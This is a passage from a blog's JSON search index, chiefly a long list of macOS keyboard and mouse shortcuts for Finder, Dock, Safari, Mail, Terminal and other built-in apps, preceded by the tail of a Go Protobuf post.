data-lang=\"diff\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprotoc --proto_path=. \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    --go_out=./ \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+    --go_opt=default_api_level=API_OPAQUE \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go","Protobuf"],"title":"Go Protobuf：新的 Opaque API"},{"categories":["URL","macOS"],"contents":" macOS Tips \u0026amp; Tricks General Native UI Conventions Press ⇧⌘/ to search all of the current app\u0026rsquo;s menu items. Then use the Up/Down arrow keys to navigate the results and press Return to execute that menu bar action. Press ⌃F2 to move keyboard focus to the application\u0026rsquo;s menu bar. Start typing the first few letters of a menu title to jump to that menu. Hold the Option key while expanding an outline view to recursively expand all children. (The easiest place to test this is in Finder\u0026rsquo;s List view.) On modal dialogs/sheets, press Command + the first letter of the button to press that button. ⌘. is the shortcut equivalent of the Escape key. Hold Control and Option while clicking on a window to switch focus to that window without raising it. Hold Command while dragging a toolbar icon to move it to a new position. By default, clicking inside a scroll bar will scroll partially towards the clicked location. Hold Option while clicking in the scroll bar to jump directly to the clicked location. Hold Option while dragging the scroller to slowly scroll. In a scroll view, use the Up/Down keys to scroll in small increments. Hold Option to scroll in larger increments, and hold Command to scroll to the beginning or end. Hold Option while pressing the Page Up/Page Down keys to also move the cursor while scrolling. In a text field that treats the Tab key as an input, press Control-Tab and Control-Shift-Tab to move focus to the previous or next control. Press ⌃⌘D while holding the pointer over a word to view an inline dictionary definition of the word. Press ⌃F6 to move focus to a floating window. To quickly find text, select some text and press ⌘E followed by ⌘G. Press ⌃⌫ to delete only the accent mark from the previous character (e.g. é will become e). In Fonts windows, enter *X to scale the current font size, e.g. *1.5. When entering text, press ⌥⇧K (on U.S. keyboards) to insert an Apple logo. Hold Command while dragging a Picture-in-Picture (PiP) video player to move it anywhere without having it snap to one of the screen corners. Screenshots After pressing ⇧⌘4 and while drawing the screen capture area, hold Option while resizing to resize from the center, and hold Shift while resizing to adjust only one axis. After drawing the area, hold the Space bar and drag to move the selected area. After pressing ⇧⌘4, hold Control while taking the screenshot to copy to the clipboard instead of saving to file. After pressing ⇧⌘4, press the Space bar to select a window to screenshot. Hold down Option while taking the screenshot to remove the window\u0026rsquo;s shadow. Right click on the floating screenshot preview to access additional actions. Open/Save Dialogs Drag a file or folder from Finder into an open/save dialog to jump directly to that file. In save dialogs, press ⌘= to switch between the compact and expanded layout. In save dialogs, press ⌘⌫ to activate the Delete button, ⌘D to activate the Don\u0026rsquo;t Save button, and ⌘. (or Esc) to activate the Cancel button. Press ~ to open a Go To File dialog prefilled with the home directory. Press / to open it prefilled with the root directory. Press ⌘R to reveal the selected item in Finder. Mission Control / Window Management When a window is inactive, use the Command key to interact with it without making it active. Hold Control when pressing the Mission Control function key to only show the current app\u0026rsquo;s windows. Hold Command when pressing the Mission Control function key to show the desktop. Hold Option while double-clicking a window\u0026rsquo;s corner to expand the window to fill the screen. Option-Click to switch windows while hiding the previous app. Command-Option-Click to switch windows and hide all other apps. In the Command-Tab app switcher, press the Up or Down arrow keys (or the 1 key) on an app to view that app\u0026rsquo;s windows. In the Command-Tab app switcher, hold Option while switching to an app to un-minimize all its windows. Press ⌘` to cycle between windows of the foreground application. Press ⌃F4 to cycle between windows across all applications in the current desktop space. Drag a window to the top of the screen and push it against the top of the screen to enter Mission Control with that window selected. Press ⌥⌘W or hold Option while clicking the red close button, to close all of the foreground application\u0026rsquo;s open windows. Press ⌥⌘M, or hold Option while clicking the yellow minimize button, to minimize all of the foreground application\u0026rsquo;s open windows. Hold Option while clicking the green zoom button to fill the window to the screen instead of entering full-screen mode. When configuring Hot Corners in System Settings, hold any or all of Control, Option, Command, or Shift to only activate the corner while the selected keys are also held down. On a trackpad, use two fingers to double-tap (tap, not click) on an app\u0026rsquo;s Dock icon to show all of the app\u0026rsquo;s windows. Alternatively, perform the App Exposé trackpad gesture over an app\u0026rsquo;s Dock icon. Hold Option while resizing a window to resize from the center of the window. Hold Shift while resizing a window to lock the aspect ratio. Double-click a window\u0026rsquo;s border to resize that edge to fill the screen. Hold Option while double-clicking to expand both edges. In Mission Control, perform a scroll up over a group of app windows to reveal the individual windows. Press the Space bar while holding the pointer over any window to magnify it. In Mission Control, Option-click another desktop space to switch to that space while staying in Mission Control. In Mission Control, drag the application icon underneath the windows to move all of an app\u0026rsquo;s windows to another space. In Mission Control app window mode, press Tab and Shift-Tab to switch applications. If a window was minimized in a different space, hold Command while un-minimizing to restore it to the current space. Hold Option while un-minimizing a window to un-minimize all windows from that app. If an app has windows in multiple spaces, click the app\u0026rsquo;s Dock icon repeatedly to cycle through the spaces with that app\u0026rsquo;s windows. If keyboard shortcuts are enabled for switching desktop spaces, pressing a shortcut while clicking and holding a window will move the window to that space. In Stage Manager, hold Shift while clicking on a window to add that window to the current stage instead of replacing it. Function Keys Hold down Shift and Option when changing the volume or brightness to make smaller adjustments. Hold down Option while changing the brightness to quickly open Display settings, or while changing the volume to open Sound settings. Hold down Shift while changing the volume to audibly preview the volume level. When connected to an external display, hold down Control while changing the brightness to adjust the brightness of the non-active display. Press and hold down on the Mission Control function key to automatically exit Mission Control after letting go of the key. Menu Bar / Notification Center Hold Option while opening the Wi-Fi and Bluetooth menus to access extra options. Hold Command while dragging a menu bar icon to move it to a new position. Add new menu bar items by dragging icons from Control Center to the menu bar. Option-click the date/time in the menu bar to toggle Do Not Disturb. Right-click a widget to change its size. On a trackpad, swipe horizontally with two fingers over a notification to dismiss that notification. Finder After copying a file, press ⌥⌘V to move the file instead of pasting a copy of it. Press ⌃⌘N with multiple files selected to create a new folder with those items. Press Tab and Shift-Tab to navigate through files alphabetically, regardless of the current sort ordering (only in Icons and List view). Hold Option while activating Quick Look to immediately launch into full-screen view. After opening Quick Look with multiple files selected, press ⌘⏎ to display a grid view of all items. Use the arrow keys to navigate and press Return to select an item to focus on. In Quick Look, right-click on the \u0026ldquo;Open with\u0026rdquo; button to select a different app to use to open the file. In Columns view, hold Option while resizing a column to simultaneously resize all columns. In Columns view, double-click a column separator to auto-resize that column. Hold Option while double-clicking on any separator to auto-resize all columns. In Columns view, click the empty space at the bottom of a folder to go to the parent folder. In Columns view, and when in a deeply nested file, press Shift-Tab and Tab to navigate through the parent directories without losing the path to the file. Hold Option while dragging a file to make a new copy instead of moving the original. Hold Command and Option to create an alias to the file. In List view, press ⌘+ and ⌘- to increase and decrease the row size. In List view, press ⌥↑ and ⌥↓ to select the top-most and bottom-most item. In List view, use the Left and Right arrow keys to collapse and expand directories. When a file is selected, press the Left arrow key to jump to the parent folder. Press ⌘I to show the inspector for the current file. Press ⌥⌘I to show a floating inspector that updates with the selected file. Press ⌥⌘C to copy the full pathname of the currently selected file. Press ⇧⌘. to toggle showing hidden files. Press ⌥⌘⌫ to immediately delete a file without sending it to the Trash. Merge folders by holding Option while dragging one folder on top of another folder. Set a custom icon for a folder by copying the new icon, inspecting the folder (⌘I), and pasting the icon by selecting the folder icon in the upper-left of the inspector window and pressing ⌘V. Drag selected text into a Finder window to quickly create and save a text clipping. (Text clippings are text files that can\u0026rsquo;t be edited and don\u0026rsquo;t require a filename to be saved.) Press ⌥⌘O to open the selected file and automatically close the Finder window. Press ⌥⇧⌘V to paste an item while preserving the file permission flags. Hold Command while dragging an icon in Icon view to align it to a grid. Restart Finder by holding Option while right-clicking the Finder dock icon and selecting Relaunch. Drag a folder to the new tab button (only visible if multiple tabs are already open) to open the folder in a new tab. Press ⌃⌘↑ to open the parent folder in a new window. If the toolbar is hidden (⌥⌘T), Finder will open folders in a new window. Press ⌘R with an image selected to rotate it clockwise, and ⌘L to rotate it counter-clockwise. Dock Press ⌥⌘D to hide and show the dock. Press ⌃F3 to move keyboard focus to the Dock. Then use the Left and Right arrow keys to select an app, or type the first few letters of an app. Press Enter to open the selected app, or press the Up arrow key to open the app\u0026rsquo;s menu. Hold Control and Shift while mousing over the Dock to temporarily turn on magnification. Quickly move the Dock to a different side of the screen by holding Shift while dragging the resize handle. Hold Option while resizing the Dock to resize in multiples of 16 points. Hold Option and Command while clicking a running app\u0026rsquo;s Dock icon to hide all other applications. Open a file in a specific application by dragging the file to the application\u0026rsquo;s Dock icon. If the application doesn\u0026rsquo;t accept the file type by default, force open the file by holding Option and Command while dragging the file. If a dock icon is bouncing repeatedly, stop the bouncing by mousing over the icon. Hold Control and Command when right-clicking a Dock icon to only see the default system menu options. Hold Option and Command when clicking on a folder in the Dock to open the folder in a new Finder window. To open multiple items from a stack, hold Option while selecting an item to open it in the background while keeping the stack open. After opening a stack, hover the cursor over an item and press the Space bar to preview the item with quick look. Right-click the Launchpad dock icon to open an app from an inline menu. In Launchpad, hold Option to enter \u0026ldquo;jiggle mode\u0026rdquo; to re-arrange and delete apps. To add AirDrop to the Dock, navigate to /System/Library/CoreServices/Finder.app/Contents/Applications in Finder and drag the AirDrop icon to the Dock. Spotlight Press ⌘B to search the web for the current query. Press ⌘C to copy the full path to the selected file, or to copy the result of the current calculation. Press ⌘D to open the Dictionary app with the current query. Press ⌘L to jump to the dictionary section in the results (if present). Press ⌘⏎ or ⌘R to reveal the selected file in Finder. Use the name: filter to only search in the filename. Add kind:folder to only search for folder names. Hold Command to show the path to the currently selected file. Safari Tab groups organize tabs spatially. Use ⌥⌘{↑,↓,←,→} to navigate tabs in 2D space. When a video is playing, right click the speaker icon in the address bar or tab to enter Picture-in-Picture (PiP) mode. Hold Option while closing a tab to close all other tabs except the current tab. Click and hold the back button to see recent browsing history. Hold Option to see page URLs instead of page titles. Drag selected text onto the Safari dock icon to quickly search the web for that text. Press ⇧⌘T to re-open the most recently closed tab or window. Click and hold on the new tab icon in the toolbar to view recently closed tabs. Press the Space bar at the beginning of the address bar to change the search engine and to see recent web searches. Add kind:bookmark to Spotlight searches to search Safari bookmarks and browsing history. Shift-click a link to add it to Reading List. Click and hold a bookmark in the bookmarks bar to edit its display title. Option-click the reload icon or press ⌥⌘R to force a fresh reload of the current webpage. Right-click the reader icon in the address bar to automatically turn on Reader Mode for all pages on the current website. After performing a web search and opening a result in the same tab, press ⌥⌘S to go back to the search results page. Press ⇧⌘I to create a new email message with the contents of the current page. Hold Option over the History \u0026gt; Clear History menu item to only clear browsing history while preserving website data. Press ⌃⌘D while hovering over a link to open an inline preview of the link. Mail Command-click multiple mailboxes in the left sidebar to simultaneously view all messages from the selected mailboxes. Select part of a message\u0026rsquo;s text before replying or forwarding to only include the selected text in the new message. Drag a file to the Mail dock icon to compose a new message with the file already attached. Press ⌥⇧⌘N to create a new tab. Press the Space bar at the end of a message to go to the next message. Hold Shift while pressing the Space bar at the top of a message to go to the previous message. Start typing the first few characters of the sender, subject, or body to jump to that message in the messages list. Press ⌥⌘↑ and ⌥⌘↓ to jump to the top-most or bottom-most message in the messages list. Save an extra copy of an important message by dragging it to the Finder. If a message bounces, use Message \u0026gt; Send Again on the bounced message to re-send it to a different address. To add a message to multiple folders, hold Command while dragging the message to each folder. Press ⇧⌘C to assign a color to a message. Drag a message into the Notes or Reminders app to add a link to the message. Press ⌘R and ⇧⌘R while replying to a message to switch between reply and reply-all. Press ⌥⌫ to delete a message without automatically opening the next message. Command-click on the currently selected message to unselect it. If a message has already been replied to, click on the reply icon in the message list to open the reply in a new window. When creating a new mailbox, add a forward slash to create a nested mailbox. After performing a search, select a mailbox from the left sidebar to filter the search to that mailbox. Hold Shift while launching Mail to reset the index. Preview Press ` to bring up a magnifier, and then press + and - to resize it. In a PDF document, re-order the pages in the document by re-ordering the pages in the sidebar. Merge two PDF documents by dragging pages from one document\u0026rsquo;s sidebar to the other document\u0026rsquo;s sidebar. In the save dialog for an image, hold Option while opening the Format menu to access an extended list of formats. Hold Option and the Space bar to activate the pan tool. Hold Option while in text selection mode to switch to rectangular text selection. Calendar Hold Shift while dragging an event to set a more precise time instead of snapping to 15-minute intervals. Click and hold the Accept button in a calendar invite to change which calendar the event is accepted to. Hold Option while pressing the Accept button in a calendar invite to accept all events. Hold Command while clicking any calendar\u0026rsquo;s checkbox in the left sidebar to show or hide all calendars. Hold Command and Option while clicking a calendar\u0026rsquo;s checkbox to only show that calendar. Add kind:event to Spotlight searches to search calendar events. Resize the mini-calendar in the bottom-left to preview more months. With an event selected, press ⌃⌥↑ and ⌃⌥↓ to adjust the time of the event. This also works with multiple events selected. In Week view, press ⌥⌘← and ⌥⌘→ to shift the view by a single day. Messages Press ⌘R to directly reply to the latest message in the conversation. Press ⇧⌘R to reply to the latest thread in the conversation. Press ⌘T to bring up the tapback selector for the latest message. Use the 1-6 number keys to select a reaction. Press ⌘E to edit the latest sent message. Press ⌥↑ and ⌥↓ in the message input field to cycle through previously sent messages. Press ⌘1-9 to jump to a pinned conversation. Right-click on a message and select Show Times to view exact timestamps for each message. Right-click the Messages icon in the Dock to quickly view and jump to unread conversations. Photos Drag an item to the \u0026ldquo;My Albums\u0026rdquo; header section to quickly create an album with that item. After adding an item to an album, use ⌃⌘A to add other items to that same album. When editing an image, hold down the M key to compare the modifications to the original. Hold Option while launching Photos to choose a different photo library to open. Drag a photo from the Photos app into a Finder window to quickly export the photo, or into the Mail or Messages app to attach the photo. When editing an image, double-click an adjustment slider to reset it. When editing an image, hold Option while holding the pointer over an adjustment slider to extend the adjustment range. Hold Option while clicking the rotate button to reverse the rotation direction. Hold Shift while cropping a photo to maintain the current aspect ratio, and hold Option to crop from the center of the photo. TextEdit In rich text mode, press Option-Tab to insert an outlined list. Press Option-Escape to autocomplete the current word. Press ⌃⌥⌘P in the find text field (⌘F) to access special search tokens. Hold Option while selecting text to make vertical text selections. The select line dialog (⌘L) supports the following formats: 1-3 selects lines 1-3 in the document +2 selects the 2nd line below the cursor -2 selects the 2nd line above the cursor +2-4 selects 3 lines, starting from 2 lines below the cursor -2-4 selects 3 lines, starting from 2 lines above the cursor Terminal Press ⇧⌘A to select the output from the previous command. Press ⌘L to clear the output from the previous command. Press ⌃⌘V to paste and format text that is properly escaped for the shell. Press ⌃T while a command is executing to view runtime statistics about the execution so far. Press ⌘{↑,↓} to select the previous/next commands. Then press ⇧⌘A to select the output of the currently selected command. Press ⇧⌘I to set a title for the current window and tab. Drag a file or folder into a Terminal window to insert its full path. Alternatively, copy a file or folder in Finder and paste it in Terminal to insert its path. Calculator Press ⌘T to open a new window that keeps a running history of calculations. Press ⌘R to enable Reverse Polish notation (RPN) mode. Press p to insert pi. Right-click the number display and select \u0026ldquo;Large Type\u0026rdquo; to view the current result in a large overlay window. Use the Convert menu to perform various unit conversions. In Programmer view (⌘3), click the individual binary bits to toggle between 0 and 1. QuickTime Player Grab a single frame from a video by pausing on the desired frame (using the Left and Right arrow keys to navigate individual frames) and pressing ⌘C. Photo Booth Hold Option while taking a picture to skip the countdown. Hold Shift while taking a picture to disable the screen flash. When choosing one of the distortion effects (on the third page), click and drag the cursor on the image preview to change the effects origin. ","date":"March 7, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250307-macos-tips/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://saurabhs.org/macos-tips\" target=\"_blank\" rel=\"noopener\"\u003emacOS Tips \u0026amp; Tricks\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"general\"\u003eGeneral\u003c/h3\u003e\n\u003ch4 id=\"native-ui-conventions\"\u003eNative UI Conventions\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003ePress ⇧⌘/ to search all of the current app\u0026rsquo;s menu items. Then use the Up/Down arrow keys to navigate the results and press \u003ccode\u003eReturn\u003c/code\u003e to execute that menu bar action.\u003c/li\u003e\n\u003cli\u003ePress ⌃F2 to move keyboard focus to the application\u0026rsquo;s menu bar. Start typing the first few letters of a menu title to jump to that menu.\u003c/li\u003e\n\u003cli\u003eHold the \u003ccode\u003eOption\u003c/code\u003e key while expanding an outline view to recursively expand all children. (The easiest place to test this is in Finder\u0026rsquo;s List view.)\u003c/li\u003e\n\u003cli\u003eOn modal dialogs/sheets, press \u003ccode\u003eCommand\u003c/code\u003e + the first letter of the button to press that button. ⌘. is the shortcut equivalent of the \u003ccode\u003eEscape\u003c/code\u003e key.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eControl\u003c/code\u003e and \u003ccode\u003eOption\u003c/code\u003e while clicking on a window to switch focus to that window without raising it.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e while dragging a toolbar icon to move it to a new position.\u003c/li\u003e\n\u003cli\u003eBy default, clicking inside a scroll bar will scroll partially towards the clicked location. Hold \u003ccode\u003eOption\u003c/code\u003e while clicking in the scroll bar to jump directly to the clicked location.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while dragging the scroller to slowly scroll.\u003c/li\u003e\n\u003cli\u003eIn a scroll view, use the Up/Down keys to scroll in small increments. Hold \u003ccode\u003eOption\u003c/code\u003e to scroll in larger increments, and hold \u003ccode\u003eCommand\u003c/code\u003e to scroll to the beginning or end.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while pressing the Page Up/Page Down keys to also move the cursor while scrolling.\u003c/li\u003e\n\u003cli\u003eIn a text field that treats the Tab key as an input, press \u003ccode\u003eControl-Tab\u003c/code\u003e and \u003ccode\u003eControl-Shift-Tab\u003c/code\u003e to move focus to the previous or next control.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌘D while holding the pointer over a word to view an inline dictionary definition of the word.\u003c/li\u003e\n\u003cli\u003ePress ⌃F6 to move focus to a floating window.\u003c/li\u003e\n\u003cli\u003eTo quickly find text, select some text and press ⌘E followed by ⌘G.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌫ to delete only the accent mark from the previous character (e.g. é will become e).\u003c/li\u003e\n\u003cli\u003eIn Fonts windows, enter \u003ccode\u003e*X\u003c/code\u003e to scale the current font size, e.g. \u003ccode\u003e*1.5\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eWhen entering text, press ⌥⇧K (on U.S. keyboards) to insert an Apple logo.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e while dragging a Picture-in-Picture (PiP) video player to move it anywhere without having it snap to one of the screen corners.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"screenshots\"\u003eScreenshots\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eAfter pressing ⇧⌘4 and while drawing the screen capture area, hold \u003ccode\u003eOption\u003c/code\u003e while resizing to resize from the center, and hold \u003ccode\u003eShift\u003c/code\u003e while resizing to adjust only one axis. After drawing the area, hold the Space bar and drag to move the selected area.\u003c/li\u003e\n\u003cli\u003eAfter pressing ⇧⌘4, hold \u003ccode\u003eControl\u003c/code\u003e while taking the screenshot to copy to the clipboard instead of saving to file.\u003c/li\u003e\n\u003cli\u003eAfter pressing ⇧⌘4, press the Space bar to select a window to screenshot. Hold down \u003ccode\u003eOption\u003c/code\u003e while taking the screenshot to remove the window\u0026rsquo;s shadow.\u003c/li\u003e\n\u003cli\u003eRight click on the floating screenshot preview to access additional actions.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"opensave-dialogs\"\u003eOpen/Save Dialogs\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eDrag a file or folder from Finder into an open/save dialog to jump directly to that file.\u003c/li\u003e\n\u003cli\u003eIn save dialogs, press ⌘= to switch between the compact and expanded layout.\u003c/li\u003e\n\u003cli\u003eIn save dialogs, press ⌘⌫ to activate the Delete button, ⌘D to activate the Don\u0026rsquo;t Save button, and ⌘. (or \u003ccode\u003eEsc\u003c/code\u003e) to activate the Cancel button.\u003c/li\u003e\n\u003cli\u003ePress \u003ccode\u003e~\u003c/code\u003e to open a Go To File dialog prefilled with the home directory. Press \u003ccode\u003e/\u003c/code\u003e to open it prefilled with the root directory.\u003c/li\u003e\n\u003cli\u003ePress ⌘R to reveal the selected item in Finder.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"mission-control--window-management\"\u003eMission Control / Window Management\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eWhen a window is inactive, use the \u003ccode\u003eCommand\u003c/code\u003e key to interact with it without making it active.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eControl\u003c/code\u003e when pressing the Mission Control function key to only show the current app\u0026rsquo;s windows.\nHold \u003ccode\u003eCommand\u003c/code\u003e when pressing the Mission Control function key to show the desktop.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while double-clicking a window\u0026rsquo;s corner to expand the window to fill the screen.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eOption\u003c/code\u003e-Click to switch windows while hiding the previous app. \u003ccode\u003eCommand-Option\u003c/code\u003e-Click to switch windows and hide all other apps.\u003c/li\u003e\n\u003cli\u003eIn the Command-Tab app switcher, press the Up or Down arrow keys (or the 1 key) on an app to view that app\u0026rsquo;s windows.\u003c/li\u003e\n\u003cli\u003eIn the Command-Tab app switcher, hold \u003ccode\u003eOption\u003c/code\u003e while switching to an app to un-minimize all its windows.\u003c/li\u003e\n\u003cli\u003ePress ⌘` to cycle between windows of the foreground application.\u003c/li\u003e\n\u003cli\u003ePress ⌃F4 to cycle between windows across all applications in the current desktop space.\u003c/li\u003e\n\u003cli\u003eDrag a window to the top of the screen and push it against the top of the screen to enter Mission Control with that window selected.\u003c/li\u003e\n\u003cli\u003ePress ⌥⌘W or hold \u003ccode\u003eOption\u003c/code\u003e while clicking the red close button, to close \u003cem\u003eall\u003c/em\u003e of the foreground application\u0026rsquo;s open windows.\u003c/li\u003e\n\u003cli\u003ePress ⌥⌘M, or hold \u003ccode\u003eOption\u003c/code\u003e while clicking the yellow minimize button, to minimize \u003cem\u003eall\u003c/em\u003e of the foreground application\u0026rsquo;s open windows.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while clicking the green zoom button to fill the window to the screen instead of entering full-screen mode.\u003c/li\u003e\n\u003cli\u003eWhen configuring Hot Corners in System Settings, hold any or all of \u003ccode\u003eControl\u003c/code\u003e, \u003ccode\u003eOption\u003c/code\u003e, \u003ccode\u003eCommand\u003c/code\u003e, or \u003ccode\u003eShift\u003c/code\u003e to only activate the corner while the selected keys are also held down.\u003c/li\u003e\n\u003cli\u003eOn a trackpad, use two fingers to double-tap (\u003cem\u003etap\u003c/em\u003e, not click) on an app\u0026rsquo;s Dock icon to show all of the app\u0026rsquo;s windows. Alternatively, perform the App Exposé trackpad gesture over an app\u0026rsquo;s Dock icon.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while resizing a window to resize from the center of the window.\nHold \u003ccode\u003eShift\u003c/code\u003e while resizing a window to lock the aspect ratio.\u003c/li\u003e\n\u003cli\u003eDouble-click a window\u0026rsquo;s border to resize that edge to fill the screen. Hold \u003ccode\u003eOption\u003c/code\u003e while double-clicking to expand both edges.\u003c/li\u003e\n\u003cli\u003eIn Mission Control, perform a scroll up over a group of app windows to reveal the individual windows. Press the Space bar while holding the pointer over any window to magnify it.\u003c/li\u003e\n\u003cli\u003eIn Mission Control, Option-click another desktop space to switch to that space while staying in Mission Control.\u003c/li\u003e\n\u003cli\u003eIn Mission Control, drag the application icon underneath the windows to move all of an app\u0026rsquo;s windows to another space.\u003c/li\u003e\n\u003cli\u003eIn Mission Control app window mode, press \u003ccode\u003eTab\u003c/code\u003e and \u003ccode\u003eShift-Tab\u003c/code\u003e to switch applications.\u003c/li\u003e\n\u003cli\u003eIf a window was minimized in a different space, hold \u003ccode\u003eCommand\u003c/code\u003e while un-minimizing to restore it to the current space.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while un-minimizing a window to un-minimize all windows from that app.\u003c/li\u003e\n\u003cli\u003eIf an app has windows in multiple spaces, click the app\u0026rsquo;s Dock icon repeatedly to cycle through the spaces with that app\u0026rsquo;s windows.\u003c/li\u003e\n\u003cli\u003eIf keyboard shortcuts are enabled for switching desktop spaces, pressing a shortcut while clicking and holding a window will move the window to that space.\u003c/li\u003e\n\u003cli\u003eIn Stage Manager, hold \u003ccode\u003eShift\u003c/code\u003e while clicking on a window to add that window to the current stage instead of replacing it.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"function-keys\"\u003eFunction Keys\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eHold down \u003ccode\u003eShift\u003c/code\u003e and \u003ccode\u003eOption\u003c/code\u003e when changing the volume or brightness to make smaller adjustments.\u003c/li\u003e\n\u003cli\u003eHold down \u003ccode\u003eOption\u003c/code\u003e while changing the brightness to quickly open Display settings, or while changing the volume to open Sound settings.\u003c/li\u003e\n\u003cli\u003eHold down \u003ccode\u003eShift\u003c/code\u003e while changing the volume to audibly preview the volume level.\u003c/li\u003e\n\u003cli\u003eWhen connected to an external display, hold down \u003ccode\u003eControl\u003c/code\u003e while changing the brightness to adjust the brightness of the non-active display.\u003c/li\u003e\n\u003cli\u003ePress and hold down on the Mission Control function key to automatically exit Mission Control after letting go of the key.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"menu-bar--notification-center\"\u003eMenu Bar / Notification Center\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while opening the Wi-Fi and Bluetooth menus to access extra options.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e while dragging a menu bar icon to move it to a new position.\u003c/li\u003e\n\u003cli\u003eAdd new menu bar items by dragging icons from Control Center to the menu bar.\u003c/li\u003e\n\u003cli\u003eOption-click the date/time in the menu bar to toggle Do Not Disturb.\u003c/li\u003e\n\u003cli\u003eRight-click a widget to change its size.\u003c/li\u003e\n\u003cli\u003eOn a trackpad, swipe horizontally with two fingers over a notification to dismiss that notification.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"finder\"\u003eFinder\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAfter copying a file, press ⌥⌘V to move the file instead of pasting a copy of it.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌘N with multiple files selected to create a new folder with those items.\u003c/li\u003e\n\u003cli\u003ePress \u003ccode\u003eTab\u003c/code\u003e and \u003ccode\u003eShift-Tab\u003c/code\u003e to navigate through files alphabetically, regardless of the current sort ordering (only in Icons and List view).\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while activating Quick Look to immediately launch into full-screen view.\u003c/li\u003e\n\u003cli\u003eAfter opening Quick Look with multiple files selected, press ⌘⏎ to display a grid view of all items. Use the arrow keys to navigate and press Return to select an item to focus on.\u003c/li\u003e\n\u003cli\u003eIn Quick Look, right-click on the \u0026ldquo;Open with\u0026rdquo; button to select a different app to use to open the file.\u003c/li\u003e\n\u003cli\u003eIn Columns view, hold \u003ccode\u003eOption\u003c/code\u003e while resizing a column to simultaneously resize all columns.\u003c/li\u003e\n\u003cli\u003eIn Columns view, double-click a column separator to auto-resize that column. Hold \u003ccode\u003eOption\u003c/code\u003e while double-clicking on any separator to auto-resize all columns.\u003c/li\u003e\n\u003cli\u003eIn Columns view, click the empty space at the bottom of a folder to go to the parent folder.\u003c/li\u003e\n\u003cli\u003eIn Columns view, and when in a deeply nested file, press \u003ccode\u003eShift-Tab\u003c/code\u003e and \u003ccode\u003eTab\u003c/code\u003e to navigate through the parent directories without losing the path to the file.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while dragging a file to make a new copy instead of moving the original. Hold \u003ccode\u003eCommand\u003c/code\u003e and \u003ccode\u003eOption\u003c/code\u003e to create an alias to the file.\u003c/li\u003e\n\u003cli\u003eIn List view, press ⌘+ and ⌘- to increase and decrease the row size.\u003c/li\u003e\n\u003cli\u003eIn List view, press ⌥↑ and ⌥↓ to select the top-most and bottom-most item.\u003c/li\u003e\n\u003cli\u003eIn List view, use the Left and Right arrow keys to collapse and expand directories. When a file is selected, press the Left arrow key to jump to the parent folder.\u003c/li\u003e\n\u003cli\u003ePress ⌘I to show the inspector for the current file.\nPress ⌥⌘I to show a floating inspector that updates with the selected file.\u003c/li\u003e\n\u003cli\u003ePress ⌥⌘C to copy the full pathname of the currently selected file.\u003c/li\u003e\n\u003cli\u003ePress ⇧⌘. to toggle showing hidden files.\u003c/li\u003e\n\u003cli\u003ePress ⌥⌘⌫ to immediately delete a file without sending it to the Trash.\u003c/li\u003e\n\u003cli\u003eMerge folders by holding \u003ccode\u003eOption\u003c/code\u003e while dragging one folder on top of another folder.\u003c/li\u003e\n\u003cli\u003eSet a custom icon for a folder by copying the new icon, inspecting the folder (⌘I), and pasting the icon by selecting the folder icon in the upper-left of the inspector window and pressing ⌘V.\u003c/li\u003e\n\u003cli\u003eDrag selected text into a Finder window to quickly create and save a text clipping. (Text clippings are text files that can\u0026rsquo;t be edited and don\u0026rsquo;t require a filename to be saved.)\u003c/li\u003e\n\u003cli\u003ePress ⌥⌘O to open the selected file \u003cem\u003eand\u003c/em\u003e automatically close the Finder window.\u003c/li\u003e\n\u003cli\u003ePress ⌥⇧⌘V to paste an item while preserving the file permission flags.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e while dragging an icon in Icon view to align it to a grid.\u003c/li\u003e\n\u003cli\u003eRestart Finder by holding 